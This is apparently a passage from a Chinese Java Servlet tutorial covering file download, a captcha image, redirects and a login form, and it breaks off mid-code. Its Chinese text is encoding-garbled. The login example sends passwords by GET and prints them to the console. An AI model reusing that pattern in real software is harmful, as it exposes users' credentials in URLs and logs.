class="variable">SC_PRECONDITION_FAILED</span> <span class="operator">=</span> <span class="number">412</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_REQUEST_ENTITY_TOO_LARGE</span> <span class="operator">=</span> <span class="number">413</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_REQUEST_URI_TOO_LONG</span> <span class="operator">=</span> <span class="number">414</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_UNSUPPORTED_MEDIA_TYPE</span> <span class="operator">=</span> <span class="number">415</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_REQUESTED_RANGE_NOT_SATISFIABLE</span> <span class="operator">=</span> <span class="number">416</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_EXPECTATION_FAILED</span> <span class="operator">=</span> <span class="number">417</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_INTERNAL_SERVER_ERROR</span> <span class="operator">=</span> <span class="number">500</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_NOT_IMPLEMENTED</span> <span class="operator">=</span> <span class="number">501</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_BAD_GATEWAY</span> <span class="operator">=</span> <span class="number">502</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_SERVICE_UNAVAILABLE</span> <span class="operator">=</span> <span class="number">503</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_GATEWAY_TIMEOUT</span> <span class="operator">=</span> <span class="number">504</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_HTTP_VERSION_NOT_SUPPORTED</span> <span class="operator">=</span> <span class="number">505</span>;</span><br></pre></td></tr></table></figure>

<h4 id="2-ä¸‹è½½æ–‡ä»¶"><a href="#2-ä¸‹è½½æ–‡ä»¶" class="headerlink" title="2.ä¸‹è½½æ–‡ä»¶"></a>2.ä¸‹è½½æ–‡ä»¶</h4><ol>
<li>å‘æµè§ˆå™¨è¾“å‡ºæ¶ˆæ¯ï¼›</li>
<li>ä¸‹è½½æ–‡ä»¶ï¼š<ol>
<li>è¦è·å–ä¸‹è½½æ–‡ä»¶çš„è·¯å¾„ï¼›</li>
<li>ä¸‹è½½çš„æ–‡ä»¶åæ˜¯å•¥ï¼Ÿ</li>
<li>è®¾ç½®æƒ³åŠæ³•è®©æµè§ˆå™¨èƒ½å¤Ÿæ”¯æŒä¸‹è½½æˆ‘ä»¬éœ€è¦çš„ä¸œè¥¿ï¼›</li>
<li>è·å–ä¸‹è½½æ–‡ä»¶çš„è¾“å…¥æµï¼›</li>
<li>åˆ›å»ºç¼“å†²åŒºï¼›</li>
<li>è·å–OutputStreamå¯¹è±¡ï¼›</li>
<li>å°†FileOutputStreamæµå†™å…¥åˆ°bufferç¼“å†²åŒºï¼›</li>
<li>ä½¿ç”¨OutputStreamå°†ç¼“å†²åŒºä¸­çš„æ•°æ®è¾“å‡ºåˆ°å®¢æˆ·ç«¯ï¼</li>
</ol>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.github.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletOutputStream;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.URLEncoder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FileServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"><span class="comment">//        1. è¦è·å–ä¸‹è½½æ–‡ä»¶çš„è·¯å¾„ï¼›</span></span><br><span class="line">        <span class="comment">// F:\java\IDEA2020.2\JavaWeb-02-Servlet\response\target\classes\02.png</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">realPath</span> <span class="operator">=</span> <span class="string">&quot;F:\\java\\IDEA2020.2\\JavaWeb-02-Servlet\\response\\target\\classes\\02.png&quot;</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;ä¸‹è½½æ–‡ä»¶çš„è·¯å¾„:&quot;</span> + realPath);</span><br><span class="line"><span class="comment">//        2. ä¸‹è½½çš„æ–‡ä»¶åæ˜¯å•¥ï¼Ÿ</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> realPath.substring(realPath.lastIndexOf(<span class="string">&quot;\\&quot;</span>) + <span class="number">1</span>);</span><br><span class="line"><span class="comment">//        3. è®¾ç½®æƒ³åŠæ³•è®©æµè§ˆå™¨èƒ½å¤Ÿæ”¯æŒä¸‹è½½æˆ‘ä»¬éœ€è¦çš„ä¸œè¥¿ï¼›</span></span><br><span class="line">        resp.setHeader(<span class="string">&quot;Content-Disposition&quot;</span>,<span class="string">&quot;attachment;filename=&quot;</span>+ URLEncoder.encode(fileName,<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line"><span class="comment">//        4. è·å–ä¸‹è½½æ–‡ä»¶çš„è¾“å…¥æµï¼›</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(realPath);</span><br><span class="line"><span class="comment">//        5. åˆ›å»ºç¼“å†²åŒºï¼›</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line"><span class="comment">//        6. è·å–OutputStreamå¯¹è±¡ï¼›</span></span><br><span class="line">        <span class="type">ServletOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> resp.getOutputStream();</span><br><span class="line"><span class="comment">//        7. å°†FileOutputStreamæµå†™å…¥åˆ°bufferç¼“å†²åŒºï¼›</span></span><br><span class="line">        <span class="keyword">while</span> ((len=in.read(buffer)) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            out.write(buffer,<span class="number">0</span>,len);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        in.close();</span><br><span class="line">        out.close();</span><br><span class="line"><span class="comment">//        8. ä½¿ç”¨OutputStreamå°†ç¼“å†²åŒºä¸­çš„æ•°æ®è¾“å‡ºåˆ°å®¢æˆ·ç«¯ï¼</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doPost(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>/response<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.github.servlet.FileServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>/response<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/down<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="3-éªŒè¯ç åŠŸèƒ½"><a href="#3-éªŒè¯ç åŠŸèƒ½" class="headerlink" title="3.éªŒè¯ç åŠŸèƒ½"></a>3.éªŒè¯ç åŠŸèƒ½</h4><ul>
<li>éªŒè¯æ€ä¹ˆæ¥çš„ï¼Ÿ<ul>
<li>å‰ç«¯å®ç°ï¼›</li>
<li>åç«¯å®ç°ï¼Œéœ€è¦ç”¨åˆ° Java çš„å›¾ç‰‡ç±»ï¼Œç”Ÿäº§ä¸€ä¸ªå›¾ç‰‡ã€‚</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.github.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.imageio.ImageIO;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.image.BufferedImage;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ImageServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"><span class="comment">//        å¦‚ä½•è®©æµè§ˆå™¨3ç§’è‡ªåŠ¨åˆ·æ–°ä¸€æ¬¡;</span></span><br><span class="line">        resp.setHeader(<span class="string">&quot;refresh&quot;</span>,<span class="string">&quot;3&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        åœ¨å†…å­˜ä¸­åˆ›å»ºä¸€ä¸ªå›¾ç‰‡</span></span><br><span class="line">        <span class="type">BufferedImage</span> <span class="variable">image</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedImage</span>(<span class="number">90</span>,<span class="number">40</span>,BufferedImage.TYPE_INT_RGB);</span><br><span class="line"><span class="comment">//        å¾—åˆ°å›¾ç‰‡,ç¬”</span></span><br><span class="line">        <span class="type">Graphics2D</span> <span class="variable">g</span> <span class="operator">=</span> (Graphics2D) image.getGraphics();</span><br><span class="line"><span class="comment">//        è®¾ç½®å›¾ç‰‡çš„èƒŒæ™¯é¢œè‰²</span></span><br><span class="line">        g.setColor(Color.white);</span><br><span class="line">        g.fillRect(<span class="number">0</span>,<span class="number">0</span>,<span class="number">90</span>,<span class="number">40</span>);</span><br><span class="line"><span class="comment">//        ç»™å›¾ç‰‡å†™æ•°æ®</span></span><br><span class="line">        g.setColor(Color.RED);</span><br><span class="line">        g.setFont(<span class="keyword">new</span> <span class="title class_">Font</span>(<span class="literal">null</span>,Font.BOLD,<span class="number">20</span>));</span><br><span class="line">        g.drawString(makeNum(),<span class="number">8</span>,<span class="number">30</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        å‘Šè¯‰æµè§ˆå™¨ï¼Œè¿™ä¸ªè¯·æ±‚ç”¨å›¾ç‰‡çš„æ–¹å¼æ‰“å¼€</span></span><br><span class="line">        resp.setContentType(<span class="string">&quot;image/jpeg&quot;</span>);</span><br><span class="line"><span class="comment">//        ç½‘ç«™å­˜åœ¨ç¼“å­˜ï¼Œä¸è®©æµè§ˆå™¨ç¼“å­˜</span></span><br><span class="line">        resp.setDateHeader(<span class="string">&quot;expires&quot;</span>,-<span class="number">1</span>);</span><br><span class="line">        resp.setHeader(<span class="string">&quot;Cache-Control&quot;</span>,<span class="string">&quot;no-cache&quot;</span>);</span><br><span class="line">        resp.setHeader(<span class="string">&quot;Pragma&quot;</span>,<span class="string">&quot;no-cache&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        æŠŠå›¾ç‰‡å†™ç»™æµè§ˆå™¨</span></span><br><span class="line">        ImageIO.write(image,<span class="string">&quot;jpg&quot;</span>, resp.getOutputStream());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    ç”Ÿæˆéšæœºæ•°</span></span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">makeNum</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">Random</span> <span class="variable">random</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">num</span> <span class="operator">=</span> random.nextInt(<span class="number">9999999</span>) + <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">7</span>-num.length() ; i++) &#123;</span><br><span class="line">            sb.append(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        num = sb.toString() + num;</span><br><span class="line">        <span class="keyword">return</span> num;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doPost(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>/imgs<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.github.servlet.ImageServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>/imgs<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/img<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="4ã€å®ç°é‡å®šå‘"><a href="#4ã€å®ç°é‡å®šå‘" class="headerlink" title="4ã€å®ç°é‡å®šå‘"></a>4ã€å®ç°é‡å®šå‘</h4><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-20/7a06838801811fc79bd57312a2e377e6--9b4f--image-20241020173351861.png" alt="image-20241020173351861"></p>
<ul>
<li>Bä¸€ä¸ªwebèµ„æºæ”¶åˆ°å®¢æˆ·ç«¯Aè¯·æ±‚åï¼ŒBä»–ä¼šé€šçŸ¥Aå®¢æˆ·ç«¯å»è®¿é—®å¦å¤–ä¸€ä¸ªwebèµ„æºCï¼Œè¿™ä¸ªè¿‡ç¨‹å«<code>é‡å®šå‘</code>ã€‚</li>
</ul>
<p>å¸¸è§åœºæ™¯ï¼š</p>
<ul>
<li>ç”¨æˆ·ç™»å½•</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">sendRedirect</span><span class="params">(String var1)</span> <span class="keyword">throws</span> IOException;</span><br></pre></td></tr></table></figure>

<ul>
<li>æµ‹è¯•ï¼š</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.github.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RedirectServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        resp.setHeader(&quot;Location&quot;,&quot;/response/img&quot;);</span></span><br><span class="line"><span class="comment">        resp.setStatus(302);</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        resp.sendRedirect(<span class="string">&quot;/response/img&quot;</span>);    <span class="comment">// é‡å®šå‘</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doPost(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>/redirectServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.github.servlet.RedirectServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>/redirectServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/red<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>é¢è¯•é¢˜ï¼šè¯·ä½ èŠèŠé‡å®šå‘å’Œè½¬å‘çš„åŒºåˆ«ï¼Ÿ</p>
</blockquote>
<ul>
<li>ç›¸åŒç‚¹ï¼šé¡µé¢éƒ½ä¼šå®ç°è·³è½¬ï¼›</li>
<li>ä¸åŒç‚¹ï¼š<ul>
<li>è¯·æ±‚è½¬å‘çš„æ—¶å€™ï¼Œurlä¸ä¼šäº§ç”Ÿå˜åŒ–ï¼›</li>
<li>é‡å®šå‘æ—¶å€™ï¼Œurlåœ°å€æ ä¼šå‘ç”Ÿå˜åŒ–ï¼›</li>
</ul>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-20/ee383ab64d939b7b9aa97432f63b918c--69f9--image-20241020173426776.png" alt="image-20241020173426776"></p>
<h4 id="5-ç®€å•å®ç°ç™»å½•é‡å®šå‘"><a href="#5-ç®€å•å®ç°ç™»å½•é‡å®šå‘" class="headerlink" title="5.ç®€å•å®ç°ç™»å½•é‡å®šå‘"></a>5.ç®€å•å®ç°ç™»å½•é‡å®šå‘</h4><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%--</span><br><span class="line">    è¿™é‡Œæäº¤çš„è·¯å¾„éœ€è¦å¯»æ‰¾åˆ°é¡¹ç›®çš„è·¯å¾„</span><br><span class="line">    $&#123;pageContext.request.contextPath&#125; : ä»£è¡¨å½“å‰é¡¹ç›®</span><br><span class="line">--%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;ç™»å½•&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;form action=<span class="string">&quot;$&#123;pageContext.request.contextPath&#125;/login&quot;</span> method=<span class="string">&quot;get&quot;</span>&gt;</span><br><span class="line">    ç”¨æˆ·å:&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span>&gt;&lt;br&gt;</span><br><span class="line">    å¯†  ç :&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span>&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">  &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.github.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RequestTest</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">// å¤„ç†è¯·æ±‚</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;password&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(username+<span class="string">&quot;:&quot;</span>+password);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// é‡å®šå‘æ—¶éœ€æ³¨æ„è·¯å¾„é—®é¢˜ï¼Œå¦åˆ™ä¸º404;</span></span><br><span class="line">        <span class="comment">// /response/success.jsp</span></span><br><span class="line">        resp.sendRedirect(<span class="string">&quot;/response/success.jsp&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doPost(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>/request<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.github.servlet.RequestTest<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>/request<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/login<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;æˆåŠŸ&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;ç™»å½•æˆåŠŸï¼ï¼ï¼&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h3 id="7-HttpServletRequest"><a href="#7-HttpServletRequest" class="headerlink" title="7.HttpServletRequest"></a>7.HttpServletRequest</h3><ul>
<li>HttpServletRequestä»£è¡¨å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œç”¨æˆ·é€šè¿‡Httpåè®®è®¿é—®æœåŠ¡å™¨ï¼ŒHTTPè¯·æ±‚ä¸­çš„æ‰€æœ‰ä¿¡æ¯ä¼šè¢«å°è£…åˆ°HttpServletRequestï¼Œé€šè¿‡è¿™ä¸ªHttpServletRequestçš„æ–¹æ³•ï¼Œè·å¾—å®¢æˆ·ç«¯çš„æ‰€æœ‰ä¿¡æ¯ï¼›</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-20/7ccd0aef635155b3634b0b59f0498e29--e05b--image-20241020174534018.png" alt="image-20241020174534018"></p>
<blockquote>
<p>è·å–å‚æ•°ï¼Œè¯·æ±‚è½¬å‘ï¼š</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.github.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HttpServletRequestTest</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        req.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        resp.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">        String[] hobbys = req.getParameterValues(<span class="string">&quot;hobbies&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;=============================&quot;</span>);</span><br><span class="line">        <span class="comment">// åå°æ¥æ”¶ä¸­æ–‡ä¹±ç é—®é¢˜</span></span><br><span class="line">        System.out.println(username);</span><br><span class="line">        System.out.println(password);</span><br><span class="line">        